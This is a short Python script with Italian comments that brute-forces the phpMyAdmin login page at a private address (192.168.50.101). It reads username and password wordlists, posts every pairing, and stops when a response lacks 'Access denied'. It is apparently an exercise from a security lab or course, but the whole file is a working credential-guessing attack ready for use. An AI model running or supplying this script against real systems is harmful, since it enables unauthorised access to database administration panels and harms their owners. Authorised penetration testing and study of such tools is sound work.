import requests

# Richiesta dei nomi dei file degli username e delle password
username_file = input("Inserisci il nome del file degli username: ")
password_file = input("Inserisci il nome del file delle password: ")

try:
	with open(username_file, 'r') as usernames, open(password_file, 'r') as passwords:
		#Iterazione sugli username
		for username in usernames:
			username = username.rstrip() # Rimuove eventuali spari bianchi alla fine
			
			# Riavvolgimento del file delle password all'inizio
			passwords.seek(0)
			
			# Iterazione sulle password
			for password in passwords:
				password = password.rstrip() # Rimuove eventuali spazi bianchi alla fine
			
				# URL di destinazione
				url = 'http://192.168.50.101/phpMyAdmin/'
			
				# Dati da inviare con la richiesta POST
				payload = {'pma_username': username, 'pma_password': password, 'input_go': 'Go'}
			
				try:
					# Effettua la richiesta POST
					response = requests.post(url, data=payload)
				
					# Stampa l'username e la password attuali
					print(f"Username: {username}, Password: {password}", end=" ")
				
					# Verifica la risposta del server
					if response.status_code == 200:
						if 'Access denied' in response.text:
							print("- Fallito")
						else:
							print('\nSuccesso!')
							exit()
					else:
						print('Errore:', response.status_code)
				except requests.exceptions.RequestException as e:
					print ('Errore nella richiesta:', e)
except FileNotFoundError:
	print("File non trovato. Assicurati che i nomi dei file siano corretti.")
